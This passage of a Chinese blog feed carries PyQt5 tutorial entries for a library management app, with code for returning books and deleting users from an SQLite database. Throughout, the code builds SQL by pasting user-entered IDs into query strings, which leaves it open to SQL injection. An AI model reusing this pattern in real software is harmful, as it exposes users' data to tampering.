COUNT(StudentId) FROM User_Book WHERE  StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (</span><br><span class="line">        self.studentId, BookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next() and query.value(0)):</span><br><span class="line">            QMessageBox.warning(self, &quot;警告&quot;, &quot;您已经借阅了本书并尚未归还，借阅失败！&quot;, QMessageBox.Yes, QMessageBox.Yes)</span><br><span class="line">            return</span><br><span class="line">        # 更新User表</span><br><span class="line">        sql &#x3D; &quot;UPDATE User SET TimesBorrowed&#x3D;TimesBorrowed+1,NumBorrowed&#x3D;NumBorrowed+1 WHERE StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 更新Book表</span><br><span class="line">        sql &#x3D; &quot;UPDATE Book SET NumCanBorrow&#x3D;NumCanBorrow-1,NumBorrowed&#x3D;NumBorrowed+1 WHERE BookId&#x3D;&#39;%s&#39;&quot; % BookId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 插入User_Book表</span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        sql &#x3D; &quot;INSERT INTO User_Book VALUES (&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,NULL,1)&quot; % (self.studentId, BookId, timenow)</span><br><span class="line">        print(sql)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        print(QMessageBox.information(self, &quot;提示&quot;, &quot;借阅成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        self.borrow_book_success_signal.emit()</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def bookIdEditChanged(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        if (bookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            self.bookNameEdit.clear()</span><br><span class="line">            self.publisherEdit.clear()</span><br><span class="line">            self.authNameEdit.clear()</span><br><span class="line">            self.publishTime.clear()</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        # 查询对应书号，如果存在就更新form</span><br><span class="line">        if (query.next()):</span><br><span class="line">            self.bookNameEdit.setText(query.value(0))</span><br><span class="line">            self.authNameEdit.setText(query.value(2))</span><br><span class="line">            self.categoryComboBox.setCurrentText(query.value(3))</span><br><span class="line">            self.publisherEdit.setText(query.value(4))</span><br><span class="line">            self.publishTime.setText(query.value(5))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; borrowBookDialog(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9bj1uvej308h0c40so.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9blcsuij308e0c7mx4.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9bkucgkj308f0c43yk.jpg" alt="这里写图片描述"></p><h2><span id="pgui-huan-shu-ji-gong-neng-shi-xian">归还书籍功能实现</span><a href="#pgui-huan-shu-ji-gong-neng-shi-xian" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>一开始的时候被借书功能带偏了，依旧使用了让用户输入书号的方式，但其实使用<code>QComboBox</code>列出已借阅图书让用户选择更好，大家可以自己试试</p><p>实现逻辑如下:</p><ul><li>如果存在借阅记录，就自动匹配书籍信息</li><li>如果输入为空，给出警告</li><li>并未借阅，给出提示</li><li>更新<code>User</code>表，<code>Book</code>表以及<code>User_Book</code>表</li></ul><h3><span id="pshi-xian-dai-ma">实现代码</span><a href="#pshi-xian-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class returnBookDialog(QDialog):</span><br><span class="line">    return_book_success_signal&#x3D;pyqtSignal()</span><br><span class="line">    def __init__(self, StudentId, parent&#x3D;None):</span><br><span class="line">        super(returnBookDialog, self).__init__(parent)</span><br><span class="line">        self.studentId &#x3D; StudentId</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;归还书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.returnStudentLabel &#x3D; QLabel(&quot;还 书 人:&quot;)</span><br><span class="line">        self.returnStudentIdLabel &#x3D; QLabel(self.studentId)</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  归还书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.returnBookButton &#x3D; QPushButton(&quot;确认归还&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.returnStudentLabel, self.returnStudentIdLabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.returnBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.returnStudentIdLabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.returnStudentLabel.setFont(font)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookNameEdit.setReadOnly(True)</span><br><span class="line">        self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setReadOnly(True)</span><br><span class="line">        self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setReadOnly(True)</span><br><span class="line">        self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.returnBookButton.setFont(font)</span><br><span class="line">        self.returnBookButton.setFixedHeight(32)</span><br><span class="line">        self.returnBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line">        self.returnBookButton.clicked.connect(self.returnButtonClicked)</span><br><span class="line">        self.bookIdEdit.textChanged.connect(self.bookIdEditChanged)</span><br><span class="line"></span><br><span class="line">    def returnButtonClicked(self):</span><br><span class="line">        # 获取书号，书号为空或并未借阅，则弹出错误</span><br><span class="line">        # 更新Book_User表User表以及Book表</span><br><span class="line">        BookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        # BookId为空的处理</span><br><span class="line">        if (BookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要还的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 打开数据库</span><br><span class="line">        db &#x3D; db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        # 如果未借阅</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User_Book WHERE StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; %(self.studentId,BookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.information(self, &quot;提示&quot;, &quot;您并未借阅此书，故无需归还&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 更新User表</span><br><span class="line">        sql &#x3D; &quot;UPDATE User SET NumBorrowed&#x3D;NumBorrowed-1 WHERE StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 更新Book表</span><br><span class="line">        sql &#x3D; &quot;UPDATE Book SET NumCanBorrow&#x3D;NumCanBorrow+1 WHERE BookId&#x3D;&#39;%s&#39;&quot; % BookId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 更新User_Book表</span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        sql &#x3D; &quot;UPDATE User_Book SET ReturnTime&#x3D;&#39;%s&#39;,BorrowState&#x3D;0 WHERE StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (timenow,self.studentId,BookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        print(QMessageBox.information(self, &quot;提示&quot;, &quot;归还成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        self.return_book_success_signal.emit()</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def bookIdEditChanged(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        if (bookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            self.bookNameEdit.clear()</span><br><span class="line">            self.publisherEdit.clear()</span><br><span class="line">            self.authNameEdit.clear()</span><br><span class="line">            self.publishTime.clear()</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        # 在User_Book表中找借阅记录，如果存在借阅，则更新form内容</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User_Book WHERE StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (</span><br><span class="line">            self.studentId, bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next()):</span><br><span class="line">            # 更新form内容</span><br><span class="line">            sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            # 查询对应书号，如果存在就更新form</span><br><span class="line">            if (query.next()):</span><br><span class="line">                self.bookNameEdit.setText(query.value(0))</span><br><span class="line">                self.authNameEdit.setText(query.value(2))</span><br><span class="line">                self.categoryComboBox.setCurrentText(query.value(3))</span><br><span class="line">                self.publisherEdit.setText(query.value(4))</span><br><span class="line">                self.publishTime.setText(query.value(5))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; returnBookDialog(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9blse4aj308e0c5748.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9bkdbcgj308e0bz3yh.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9bjfb6vj308g0c6glq.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（7）——用户管理</title>
    <url>/f6234a21.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>对于用户管理，本来应该包含添加用户，删除用户等操作的，但是为了实现简单，添加用户就用注册代替了，所以所谓用户管理，只是实现了用户的删除操作</p><p>为了删除用户的同时保护数据库的完整性和约束，需要进行以下操作</p><ul><li>从<code>User</code>表删除该用户</li><li>将该用户所借阅的所有书籍全部归还</li></ul><a id="more"></a><h2><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import time</span><br><span class="line">import sip</span><br><span class="line"></span><br><span class="line">class UserManage(QDialog):</span><br><span class="line">    def __init__(self,parent&#x3D;None):</span><br><span class="line">        super(UserManage, self).__init__(parent)</span><br><span class="line">        self.resize(280, 400)</span><br><span class="line">        self.layout &#x3D; QVBoxLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line">        self.setWindowTitle(&quot;管理用户&quot;)</span><br><span class="line">        # 用户数</span><br><span class="line">        self.userCount &#x3D; 0</span><br><span class="line">        self.oldDeleteId &#x3D; &quot;&quot;</span><br><span class="line">        self.oldDeleteName &#x3D; &quot;&quot;</span><br><span class="line">        self.deleteId &#x3D; &quot;&quot;</span><br><span class="line">        self.deleteName &#x3D; &quot;&quot;</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        self.db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        self.db.open()</span><br><span class="line">        self.query &#x3D; QSqlQuery()</span><br><span class="line">        self.getResult()</span><br><span class="line"></span><br><span class="line">        # 表格设置</span><br><span class="line">        self.tableWidget &#x3D; QTableWidget()</span><br><span class="line">        self.tableWidget.setRowCount(self.userCount)</span><br><span class="line">        self.tableWidget.setColumnCount(2)</span><br><span class="line">        self.tableWidget.setHorizontalHeaderLabels([&#39;学号&#39;, &#39;姓名&#39;])</span><br><span class="line">        # 不可编辑</span><br><span class="line">        self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        # 标题可拉伸</span><br><span class="line">        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        # 整行选中</span><br><span class="line">        self.tableWidget.setSelectionBehavior(QAbstractItemView.SelectRows)</span><br><span class="line"></span><br><span class="line">        self.layout.addWidget(self.tableWidget)</span><br><span class="line">        self.setRows()</span><br><span class="line">        self.deleteUserButton &#x3D; QPushButton(&quot;删 除 用 户&quot;)</span><br><span class="line">        hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        hlayout.addWidget(self.deleteUserButton, Qt.AlignHCenter)</span><br><span class="line">        self.widget &#x3D; QWidget()</span><br><span class="line">        self.widget.setLayout(hlayout)</span><br><span class="line">        self.widget.setFixedHeight(48)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(15)</span><br><span class="line">        self.deleteUserButton.setFixedHeight(36)</span><br><span class="line">        self.deleteUserButton.setFixedWidth(180)</span><br><span class="line">        self.deleteUserButton.setFont(font)</span><br><span class="line">        self.layout.addWidget(self.widget, Qt.AlignCenter)</span><br><span class="line">        # 设置信号</span><br><span class="line">        self.deleteUserButton.clicked.connect(self.deleteUser)</span><br><span class="line">        self.tableWidget.itemClicked.connect(self.getStudentInfo)</span><br><span class="line"></span><br><span class="line">    def getResult(self):</span><br><span class="line">        sql &#x3D; &quot;SELECT StudentId,Name FROM User WHERE IsAdmin&#x3D;0&quot;</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        self.userCount &#x3D; 0;</span><br><span class="line">        while (self.query.next()):</span><br><span class="line">            self.userCount +&#x3D; 1;</span><br><span class="line">        sql &#x3D; &quot;SELECT StudentId,Name FROM User WHERE IsAdmin&#x3D;0&quot;</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line"></span><br><span class="line">    def setRows(self):</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        for i in range(self.userCount):</span><br><span class="line">            if (self.query.next()):</span><br><span class="line">                StudentIdItem &#x3D; QTableWidgetItem(self.query.value(0))</span><br><span class="line">                StudentNameItem &#x3D; QTableWidgetItem(self.query.value(1))</span><br><span class="line">                StudentIdItem.setFont(font)</span><br><span class="line">                StudentNameItem.setFont(font)</span><br><span class="line">                StudentIdItem.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)</span><br><span class="line">                StudentNameItem.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)</span><br><span class="line">                self.tableWidget.setItem(i, 0, StudentIdItem)</span><br><span class="line">                self.tableWidget.setItem(i, 1, StudentNameItem)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def getStudentInfo(self, item):</span><br><span class="line">        row &#x3D; self.tableWidget.currentIndex().row()</span><br><span class="line">        self.tableWidget.verticalScrollBar().setSliderPosition(row)</span><br><span class="line">        self.getResult()</span><br><span class="line">        i &#x3D; 0</span><br><span class="line">        while (self.query.next() and i !&#x3D; row):</span><br><span class="line">            i &#x3D; i + 1</span><br><span class="line">        self.oldDeleteId &#x3D; self.deleteId</span><br><span class="line">        self.oldDeleteName &#x3D; self.deleteName</span><br><span class="line">        self.deleteId &#x3D; self.query.value(0)</span><br><span class="line">        self.deleteName &#x3D; self.query.value(1)</span><br><span class="line"></span><br><span class="line">    def deleteUser(self):</span><br><span class="line">        if (self.deleteId &#x3D;&#x3D; &quot;&quot; and self.deleteName &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;请选中要删除的用户&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        elif (self.deleteId &#x3D;&#x3D; self.oldDeleteId and self.deleteName &#x3D;&#x3D; self.oldDeleteName):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;请选中要删除的用户&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        if (QMessageBox.information(self, &quot;提醒&quot;, &quot;删除用户:%s,%s\n用户一经删除将无法恢复，是否继续?&quot; % (self.deleteId, self.deleteName),</span><br><span class="line">                                    QMessageBox.Yes | QMessageBox.No,</span><br><span class="line">                                    QMessageBox.No) &#x3D;&#x3D; QMessageBox.No):</span><br><span class="line">            return</span><br><span class="line">        # 从User表删除用户</span><br><span class="line">        sql &#x3D; &quot;DELETE FROM User WHERE StudentId&#x3D;&#39;%s&#39;&quot; % (self.deleteId)</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        self.db.commit()</span><br><span class="line">        # 归还所有书籍</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User_Book  WHERE StudentId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % self.deleteId</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        updateQuery&#x3D;QSqlQuery()</span><br><span class="line">        while (self.query.next()):</span><br><span class="line">            bookId&#x3D;self.query.value(1)</span><br><span class="line">            sql&#x3D;&quot;UPDATE Book SET NumCanBorrow&#x3D;NumCanBorrow+1 WHERE BookId&#x3D;&#39;%s&#39;&quot;% bookId</span><br><span class="line">            updateQuery.exec_(sql)</span><br><span class="line">            self.db.commit()</span><br><span class="line">        sql&#x3D;&quot;UPDATE User_Book SET ReturnTime&#x3D;&#39;%s&#39;,BorrowState&#x3D;0 WHERE StudentId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot;%(timenow,self.deleteId)</span><br><span class="line">        self.query.exec_(sql)</span><br><span class="line">        self.db.commit()</span><br><span class="line">        print(QMessageBox.information(self,&quot;提醒&quot;,&quot;删除用户成功!&quot;,QMessageBox.Yes,QMessageBox.Yes))</span><br><span class="line">        self.updateUI()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def updateUI(self):</span><br><span class="line">        self.getResult()</span><br><span class="line">        self.layout.removeWidget(self.widget)</span><br><span class="line">        self.layout.removeWidget(self.tableWidget)</span><br><span class="line">        sip.delete(self.widget)</span><br><span class="line">        sip.delete(self.tableWidget)</span><br><span class="line">        # 表格设置</span><br><span class="line">        self.tableWidget &#x3D; QTableWidget()</span><br><span class="line">        self.tableWidget.setRowCount(self.userCount)</span><br><span class="line">        self.tableWidget.setColumnCount(2)</span><br><span class="line">        self.tableWidget.setHorizontalHeaderLabels([&#39;学号&#39;, &#39;姓名&#39;])</span><br><span class="line">        # 不可编辑</span><br><span class="line">        self.tableWidget.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        # 标题可拉伸</span><br><span class="line">        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        # 整行选中</span><br><span class="line">        self.tableWidget.setSelectionBehavior(QAbstractItemView.SelectRows)</span><br><span class="line"></span><br><span class="line">        self.layout.addWidget(self.tableWidget)</span><br><span class="line">        self.setRows()</span><br><span class="line">        self.deleteUserButton &#x3D; QPushButton(&quot;删 除 用 户&quot;)</span><br><span class="line">        hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        hlayout.addWidget(self.deleteUserButton, Qt.AlignHCenter)</span><br><span class="line">        self.widget &#x3D; QWidget()</span><br><span class="line">        self.widget.setLayout(hlayout)</span><br><span class="line">        self.widget.setFixedHeight(48)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(15)</span><br><span class="line">        self.deleteUserButton.setFixedHeight(36)</span><br><span class="line">        self.deleteUserButton.setFixedWidth(180)</span><br><span class="line">        self.deleteUserButton.setFont(font)</span><br><span class="line">        self.layout.addWidget(self.widget, Qt.AlignCenter)</span><br><span class="line">        # 设置信号</span><br><span class="line">        self.deleteUserButton.clicked.connect(self.deleteUser)</span><br><span class="line">        self.tableWidget.itemClicked.connect(self.getStudentInfo)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; UserManage()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pdai-ma-fen-xi">代码分析</span><a href="#pdai-ma-fen-xi" class="header-anchor">#</a></h2><p>这里使用	<code>QtableWidget</code>来展示当前所有的用户的学号以及姓名<br>步骤如下：</p><ul><li>展示所有用户</li><li>管理员选中一行</li><li>点击删除用户</li><li>提醒时候确认删除</li><li>删除，同时刷新展示的数据</li></ul><h2><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h2><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb94es1dfj307w0c2748.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb94e5jjxj307u0c20su.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（6）——书籍信息查询实现</title>
    <url>/ec62120c.html</url>
